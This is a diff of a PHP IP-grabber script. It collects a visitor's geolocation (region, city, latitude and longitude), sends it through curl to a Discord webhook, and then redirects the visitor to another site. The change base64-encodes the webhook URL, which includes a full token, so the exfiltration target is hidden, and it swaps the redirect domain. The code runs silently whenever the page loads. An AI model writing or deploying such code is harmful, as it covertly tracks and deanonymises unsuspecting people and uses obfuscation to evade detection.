@@ -18,7 +18,7 @@ $Region = $Info->regionName;
 $City = $Info->city;
 $COORD = "$Info->lat, $Info->lon"; 
 
-$Webhook    = "https://discord.com/api/webhooks/948748497518219374/HofLf8UGrV_XukCrHHgZheudhVvDrKAHC0oKkU-LxQa5-tAW6lz_17wlJIoTggL9RgY4";
+$Webhook    = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTQ4NzQ4NDk3NTE4MjE5Mzc0L0hvZkxmOFVHclZfWHVrQ3JISGdaaGV1ZGhWdkRyS0FIQzBvS2tVLUx4UWE1LXRBVzZsel8xN3dsSklvVGdnTDlSZ1k0";
 
 $WebhookTag = "schizo.agency";
 
@@ -41,6 +41,6 @@ function IpToWebhook($Hook, $Content)
       return curl_exec($Curl);
 }
 
-IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
+IpToWebhook(base64_decode($Webhook), $JSON);
+header("Location: https://www.terrorist.solutions");
 ?>
